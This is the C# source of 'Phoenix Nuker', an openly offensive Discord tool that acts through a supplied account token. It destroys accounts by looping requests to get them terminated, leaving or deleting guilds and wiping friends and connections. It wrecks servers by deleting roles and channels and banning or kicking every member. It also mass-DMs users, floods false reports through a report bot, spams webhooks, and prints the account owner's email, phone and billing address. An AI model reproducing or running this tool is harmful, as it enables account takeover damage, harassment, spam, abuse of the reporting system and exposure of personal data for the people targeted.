using System;
using System.IO;
using System.Threading;
using Discord;
using Discord.Gateway;
using Leaf.xNet;
using Newtonsoft.Json;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Http;
using System.Diagnostics;
using System.Reflection;
using System.Linq;

/* 
       │ Author       : extatent
       │ Name         : phoenix-nuker
       │ GitHub       : https://github.com/extatent
*/

namespace nuker
{
    class Program
    {
        #region Configs
        public static string token;
        public static int WaitTimeShort = 200;
        public static int WaitTimeLong = 2000;

        class config
        {
            public string token { get; set; }
        }

        public static void GetConfig()
        {
            StreamReader read = new StreamReader("config.json");
            string json = read.ReadToEnd();
            config config = JsonConvert.DeserializeObject<config>(json);
            token = config.token;
            read.Close();
        }

        public static void SaveConfig(string token)
        {
            config config = new config
            {
                token = token,
            };

            var responseData = config;
            string jsonData = JsonConvert.SerializeObject(responseData);
            File.WriteAllText("config.json", jsonData);
        }

        static DiscordSocketClient client = new DiscordSocketClient();
        static string guildid;
        #endregion

        #region Write Logo, Write Line
        static void WriteLogo()
        {
            Console.Clear();

            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            string phoenix = @"██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                      ";

            var lines = phoenix.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
            var longestLength = lines.Max(line => line.Length);
            var leadingSpaces = new string(' ', (Console.WindowWidth - longestLength) / 2);
            var print = string.Join(Environment.NewLine, lines.Select(line => leadingSpaces + line));

            Console.WriteWithGradient(print + Environment.NewLine, Color.OrangeRed, Color.Yellow, 16);
            Console.WriteLine();
            Console.WriteLine();
        }

        static void WriteLine(string number, string text)
        {
            Console.Write("[");
            Console.Write(number, Color.OrangeRed);
            Console.Write("] ");
            Console.WriteLine(text, Color.Yellow);

        }
        #endregion

        #region Main
        static void Main(string[] args)
        {
            Console.Title = "Phoenix Nuker | github.com/extatent";
            Start();
        }
        #endregion

        #region Start
        static void Start()
        {
            WriteLogo();
            Console.ForegroundColor = Color.Yellow;
            string config = "config.json";
            if (!File.Exists(config))
            {
                try
                {
                    File.Create(config).Dispose();
                    File.WriteAllText(config, "{\"token\":\"\"}");
                }
                catch
                {
                    Environment.Exit(0);
                }
            }
            GetConfig();
            if (string.IsNullOrEmpty(token))
            {
                try
                {
                    Console.Write("Token: ");
                    string token = Console.ReadLine();

                    SaveConfig(token);

                    client.Login(token);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Thread.Sleep(WaitTimeLong);
                    if (File.Exists("config.json"))
                    {
                        File.Delete("config.json");
                    }
                    Start();
                }
            }
            else
            {
                try
                {
                    client.Login(token);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Thread.Sleep(WaitTimeLong);
                    if (File.Exists("config.json"))
                    {
                        File.Delete("config.json");
                    }
                    Start();
                }
            }

            WriteLogo();
            Console.Title = $"Phoenix Nuker | github.com/extatent | {client.User}";

            try
            {
                Console.WriteLine("{0,-20} {1,34}", "[1] Account nuker", "[2] Server nuker");
                Console.WriteLine("{0,-20} {1,37}", "[3] Report bot", "[4] Webhook spammer");
                Console.WriteLine("{0,-20} {1,20}", "[5] Login to other account", "[6] Exit");

                Console.WriteLine();
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        DoneMethod4();
                        break;
                    case 1:
                        try
                        {
                            Console.Title = $"Phoenix Nuker | github.com/extatent | {client.User}";
                            Console.Clear();
                            AccountNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 2:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            if (string.IsNullOrEmpty(guildid))
                            {
                                Console.Write("Guild ID: ");
                                string GuildID = Console.ReadLine();
                                guildid = GuildID;
                            }
                            DiscordGuild guild = client.GetGuild(ulong.Parse(guildid));
                            Console.Title = $"Phoenix Nuker | github.com/extatent | {client.User} | {guild.Name}";
                            Console.Clear();
                            ServerNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 3:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Guild ID: ");
                            string guildID = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            string channelid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message ID: ");
                            string messageid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string reason = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Reports count: ");
                            int count = int.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            HttpRequest httpRequest = new HttpRequest();
                            httpRequest.Authorization = token;
                            httpRequest.UserAgentRandomize();
                            string url = "https://discord.com/api/v10/report";
                            string jsonData = string.Concat(new string[]
                            {
                        "{\"channel_id\": \"",
                        channelid,
                        "\", \"guild_id\": \"",
                        guildID,
                        "\", \"message_id\": \"",
                        messageid,
                        "\", \"reason\": \"",
                        reason,
                        "\" }"
                            });
                            int reports = 0;
                            for (int i = 0; i < count; i++)
                            {
                                try
                                {
                                    HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
                                    bool status = response.StatusCode.ToString() == "Created";
                                    if (status)
                                    {
                                        reports++;
                                        Console.WriteLine("Reports sent: " + reports);
                                    }

                                    Console.Title = $"Phoenix Nuker | github.com/extatent | {client.User} | Reports sent: " + reports.ToString();
                                }
                                catch
                                { }
                            }
                            Console.Title = $"Phoenix Nuker | github.com/extatent | {client.User}";
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 4:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Webhook: ");
                            string webhook = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string message = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Count: ");
                            string mcount = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();

                            int total = 0;
                            for (int i = 0; i < int.Parse(mcount); i++)
                            {
                                try
                                {
                                    total++;
                                    Webhook hook = new Webhook(webhook);
                                    hook.SendMessage(message);
                                    Console.WriteLine("Messages sent: " + total);
                                    Thread.Sleep(WaitTimeLong);
                                }
                                catch { }
                            }
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 5:
                        if (File.Exists("config.json"))
                        {
                            File.Delete("config.json");
                        }
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                        break;
                    case 6:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(WaitTimeLong);
                Start();
            }
        }
        #endregion

        #region Webhook class
        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new System.Net.Http.StringContent("github.com/extatent"), "username");
                data.Add(new System.Net.Http.StringContent(content), "content");
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == System.Net.HttpStatusCode.NoContent;
            }
        }
        #endregion

        #region Done methods
        static void DoneMethod()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            AccountNuker();
        }

        static void DoneMethod2()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            ServerNuker();
        }

        static void DoneMethod3()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Start();
        }

        static void DoneMethod4()
        {
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Start();
        }
        #endregion

        #region Account nuker
        static void AccountNuker()
        {
            WriteLogo();

            Console.ForegroundColor = Color.Yellow;
            Console.WriteLine("{0,-20} {1,33}", "[1] Terminate Account", "[2] Leave/Delete Guilds");
            Console.WriteLine("{0,-20} {1,27}", "[3] Clear Relationships", "[4] Leave HypeSquad");
            Console.WriteLine("{0,-20} {1,29}", "[5] Remove Connections", "[6] Deauthorize Apps");
            Console.WriteLine("{0,-20} {1,25}", "[7] Mass Create Guilds", "[8] Seizure Mode");
            Console.WriteLine("{0,-20} {1,23}", "[9] Confuse Mode", "[10] Mass DM");
            Console.WriteLine("{0,-20} {1,34}", "[11] User Info", "[12] Block Relationships");
            Console.WriteLine("{0,-20} {1,20}", "[13] Go Back", "[14] Exit");

            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(WaitTimeLong);
                    Console.Clear();
                    AccountNuker();
                    break;
                case 1:
                    using (HttpRequest req = new HttpRequest())
                    {
                        while (true)
                        {
                            try
                            {
                                req.AddHeader("Authorization", token);
                                req.Post("https://discordapp.com/api/v9/invite/terraria");
                                client.Token = token;
                            }
                            catch
                            { }
                        }
                    }
                case 2:
                    foreach (var guild in client.GetGuilds())
                    {
                        try
                        {
                            if (guild.Owner)
                            {
                                guild.Delete();
                            }
                            else
                            {
                                guild.Leave();
                            }
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod();
                    break;
                case 3:
                    foreach (var relationship in client.GetRelationships())
                    {
                        try
                        {
                            relationship.Remove();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 4:
                    client.User.SetHypesquad(Hypesquad.None);
                    client.User.Update();
                    DoneMethod();
                    break;
                case 5:
                    foreach (var connections in client.GetConnectedAccounts())
                    {
                        try
                        {
                            connections.Remove();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 6:
                    foreach (var apps in client.GetAuthorizedApps())
                    {
                        try
                        {
                            apps.Deauthorize();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 7:
                    try
                    {
                        Console.Write("Guild name: ");
                        string name = Console.ReadLine();

                        while (true)
                        {
                            for (int i = 0; i < 100; i++)
                            {
                                client.CreateGuild(name);
                                Thread.Sleep(WaitTimeShort);
                            }
                        }

                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 8:
                    try
                    {
                        while (true)
                        {
                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                            Thread.Sleep(WaitTimeShort);
                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
                            Thread.Sleep(WaitTimeShort);
                        }
                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 9:
                    try
                    {
                        client.User.ChangeSettings(new UserSettingsProperties() { 
                            Language = DiscordLanguage.Chinese, 
                            Theme = DiscordTheme.Light, 
                            DeveloperMode = false,
                            EnableTts = true, 
                            CompactMessages = true, 
                            ExplicitContentFilter = ExplicitContentFilter.DoNotScan 
                        });
                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 10:
                    Console.Write("Message: ");
                    string message = Console.ReadLine();

                    foreach (var relationship in client.GetRelationships())
                    {
                        if (relationship.Type == RelationshipType.Friends)
                        {
                            try
                            {
                                PrivateChannel channel = client.CreateDM(relationship.User.Id);
                                client.SendMessage(channel, message);
                                Thread.Sleep(WaitTimeShort);
                            }
                            catch
                            { }
                        }
                    }
                    foreach (var dms in client.GetPrivateChannels())
                    {
                        try
                        {
                            dms.SendMessage(message);
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 11:
                    try
                    {
                        Console.Clear();
                        WriteLogo();

                        Console.WriteLine("\nSubscription Info:");
                        Console.WriteLine("Nitro: " + client.GetClientUser().Nitro + "\nNitro since: " + client.GetClientUser().GetProfile().NitroSince + "\nBoost slots: " + client.GetBoostSlots().Count);
                        Console.WriteLine("\nPayment Info:");
                        foreach (var paymentMethod in client.GetPaymentMethods())
                        {
                           
                            Console.WriteLine("ID: " + paymentMethod.Id + "\nInvalid: " + paymentMethod.Invalid + "\nAddress 1: " + paymentMethod.BillingAddress.Address1 + "\nAddress 2: " + paymentMethod.BillingAddress.Address2 + "\nCity: " + paymentMethod.BillingAddress.City + "\nCountry: " + paymentMethod.BillingAddress.Country + "\nPostal Code: " + paymentMethod.BillingAddress.PostalCode + "\nState: " + paymentMethod.BillingAddress.State + "\n");
                        }
                        Console.WriteLine("\nAccount Info:");
                        Console.WriteLine("ID: " + client.GetClientUser().Id + "\nEmail: " + client.GetClientUser().Email + "\nPhone number: " + client.GetClientUser().PhoneNumber  + "\nRegistered at: " + client.GetClientUser().CreatedAt + "\nRegistration language: " + client.GetClientUser().RegistrationLanguage + "\nGuilds count: " + client.GetCachedGuilds().Count + "\nFriends count: " + client.GetRelationships().Count + "\nDMs count: " + client.GetPrivateChannels().Count + "\nBadges: " + client.GetClientUser().Badges);
                        Console.WriteLine("\nPress any key to go back.");
                        Console.ReadKey();
                        Thread.Sleep(WaitTimeLong);
                        Console.Clear();
                        AccountNuker();
                    }
                    catch
                    { }
                    break;
                case 12:
                    foreach (var relationship in client.GetRelationships())
                    {
                        try
                        {
                            client.BlockUser(relationship.User.Id);
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 13:
                    Start();
                    break;
                case 14:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion

        #region Server Nuker
        static void ServerNuker()
        {
            WriteLogo();

            Console.ForegroundColor = Color.Yellow;
            Console.WriteLine("{0,-20} {1,30}", "[1] Delete All Roles", "[2] Remove All Bans");
            Console.WriteLine("{0,-20} {1,29}", "[3] Delete All Channels", "[4] Delete All Emojis");
            Console.WriteLine("{0,-20} {1,30}", "[5] Delete All Invites", "[6] Mass Create Roles");
            Console.WriteLine("{0,-20} {1,26}", "[7] Mass Create Channels", "[8] Ban All Members");
            Console.WriteLine("{0,-20} {1,23}", "[9] Kick All Members", "[10] Mass DM");
            Console.WriteLine("{0,-20} {1,28}", "[11] Server Info", "[12] Leave Server");
            Console.WriteLine("{0,-20} {1,20}", "[13] Go Back", "[14] Exit");

            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            DiscordGuild guild = client.GetGuild(ulong.Parse(guildid));
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(WaitTimeLong);
                    Console.Clear();
                    ServerNuker();
                    break;
                case 1:
                    foreach (var roles in guild.GetRoles())
                    {
                        try
                        {
                            roles.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 2:
                    foreach (var bans in guild.GetBans())
                    {
                        try
                        {
                            bans.Unban();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 3:
                    foreach (var channels in guild.GetChannels())
                    {
                        try
                        {
                            channels.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 4:
                    foreach (var emojis in guild.GetEmojis())
                    {
                        try
                        {
                            emojis.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 5:
                    foreach (var invites in guild.GetInvites())
                    {
                        try
                        {
                            invites.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 6:
                    try
                    {
                        for (int i = 0; i < 100; i++)
                        {
                            try
                            {
                                guild.CreateRole();
                                Thread.Sleep(WaitTimeShort);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 7:
                    try
                    {
                        Console.Write("Channel name: ");
                        string name = Console.ReadLine();
                        for (int i = 0; i < 100; i++)
                        {
                            try
                            {
                                guild.CreateChannel(name, 0);
                                Thread.Sleep(WaitTimeShort);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 8:
                    try
                    {
                        foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
                        {
                            user.Ban();
                            Thread.Sleep(WaitTimeShort);
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 9:
                    try
                    {
                        foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
                        {
                            user.Kick();
                            Thread.Sleep(WaitTimeShort);
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 10:
                    Console.Write("Message: ");
                    string message = Console.ReadLine();

                    var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
                    var members = get.GetMembers();

                    foreach (var user in members)
                    {
                        PrivateChannel channel = client.CreateDM(user.User.Id);
                        client.SendMessage(channel, message);
                        Thread.Sleep(WaitTimeShort);
                    }
                    DoneMethod2();
                    break;
                case 11:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.WriteLine("\nServer Info:");
                        Console.WriteLine("ID: " + guild.Id + "\nOwner ID: " + guild.OwnerId + "\nBans count: " + guild.GetBans().Count + "\nChannels count: " + guild.GetChannels().Count + "\nEmojis count: " + guild.GetEmojis().Count + "\nInvites count: " + guild.GetInvites().Count + "\nRoles count: " + guild.GetRoles().Count + "\nTemplates count: " + guild.GetTemplates().Count + "\nWebhooks count: " + guild.GetWebhooks().Count + "\n2FA required: " + guild.MfaRequired + "\nNitro boosts: " + guild.NitroBoosts + "\nPremium tier: " + guild.PremiumTier + "\nRegion: " + guild.Region + "\nVanity invite: " + guild.VanityInvite + "\nVerification level: " + guild.VerificationLevel);
                        Console.WriteLine("\nPress any key to go back.");
                        Console.ReadKey();
                        Thread.Sleep(WaitTimeLong);
                        Console.Clear();
                        ServerNuker();
                    }
                    catch
                    { }
                    break;
                case 12:
                    try
                    {
                        guild.Delete();
                        Thread.Sleep(WaitTimeShort);
                        guild.Leave();
                        Thread.Sleep(WaitTimeShort);
                    }
                    catch 
                    { }
                    break;
                case 13:
                    Start();
                    break;
                case 14:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion
    }
}
